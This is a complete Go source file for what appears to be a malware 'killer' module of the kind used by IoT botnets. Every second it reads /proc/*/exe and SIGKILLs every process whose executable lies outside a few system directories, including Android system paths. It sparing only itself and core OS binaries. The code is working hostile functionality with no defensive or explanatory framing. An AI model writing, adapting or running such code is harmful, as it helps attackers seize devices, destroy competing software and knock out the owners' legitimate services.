package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
)

type Process struct {
	Pid  int
	Path string
}

var (
	KillQueue   = make(chan *Process, 1024)
	Blacklisted = []string{
		"/usr/bin/",
		"/usr/lib/",
		"/bin/",
		"/sbin/",
		"/lib/systemd/",
		"/usr/lib/systemd",
		"/system/system/bin/",
		"/init",
	}
)

func QueueWorker() {
	for {
		data, open := <-KillQueue
		if !open {
			return
		}
		syscall.Kill(data.Pid, syscall.SIGKILL)
	}
}

func Worker() {
	go QueueWorker()
	for {
		system, err := filepath.Glob("/proc/*/exe")
		if err != nil {
			continue
		}
		for _, procObject := range system {
			link, err := os.Readlink(procObject)
			if err != nil {
				continue
			}

			if strings.Contains(procObject, fmt.Sprint(os.Getpid())) || strings.Contains(procObject, "self") {
				continue
			}

			if !IsPath(link, Blacklisted) {
				pid, err := strconv.Atoi(strings.TrimLeft(strings.TrimRight(procObject, "/exe"), "/proc/"))
				if err != nil {
					fmt.Println(err)
					continue
				}
				KillQueue <- &Process{
					Pid:  pid,
					Path: link,
				}
				continue
			}
		}
		time.Sleep(1 * time.Second)
	}
}

func IsPath(path string, paths []string) bool {
	for _, safe := range paths {
		if strings.Contains(path, safe) {
			return true
		}
	}

	return false
}